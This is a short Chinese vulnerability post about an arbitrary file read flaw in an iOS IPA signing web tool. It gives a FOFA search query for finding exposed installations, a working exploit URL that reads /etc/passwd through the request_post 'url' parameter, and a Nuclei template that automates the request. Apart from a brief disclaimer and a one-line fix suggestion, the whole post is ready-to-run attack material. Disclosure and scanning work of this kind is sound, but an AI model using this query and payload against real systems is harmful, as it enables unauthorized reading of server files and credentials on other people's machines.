@[toc]
## 免责申明
本文章仅供学习与交流，请勿用于非法用途，均由使用者本人负责，文章作者不为此承担任何责任
## 漏洞描述
该系统是苹果iOS端的IPA签名工具可以一键签名APP分身，支持安装未上架App Store的内测应用。用户可以在线批量导入源，若拥有自己的证书，签名功能完全免费且无任何限制，支持证书导入和文件分享，不限制签名数量。在request_post接口处的url参数中存在任意文件读取漏洞
## 搜索语法
fofa
```
body="/assets/index/css/mobileSelect.css"
```

## 漏洞复现
访问漏洞路径
```
https://ip/api/index/request_post?url=file:///etc/passwd&post_data=1
```
![在这里插入图片描述](https://i-blog.csdnimg.cn/direct/16b3d1e0eabf46ce85beb2f339136fd9.png)

## nuclei
```yaml
id: IOS-sign-tools-readfile

info:
  name: Template Name
  author: 'xl'
  severity: info
  description: description
  tags: tags

http:
  - raw:
      - "GET /api/index/request_post?url=file:///etc/passwd&post_data=1 HTTP/2\nHost:\
        \ \nSec-Ch-Ua: \"Not;A=Brand\";v=\"24\", \"Chromium\";v=\"128\"\nSec-Ch-Ua-Mobile:\
        \ ?0\nSec-Ch-Ua-Platform: \"Windows\"\nAccept-Language: zh-CN,zh;q=0.9\nUpgrade-Insecure-Requests:\
        \ 1\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36\
        \ (KHTML, like Gecko) Chrome/128.0.6613.120 Safari/537.36\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\n\
        Sec-Fetch-Site: none\nSec-Fetch-Mode: navigate\nSec-Fetch-User: ?1\nSec-Fetch-Dest:\
        \ document\nAccept-Encoding: gzip, deflate, br\nPriority: u=0, i\n\n"

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - root
      - type: status
        status:
          - 200

```

## 修复建议
更新的最新版本
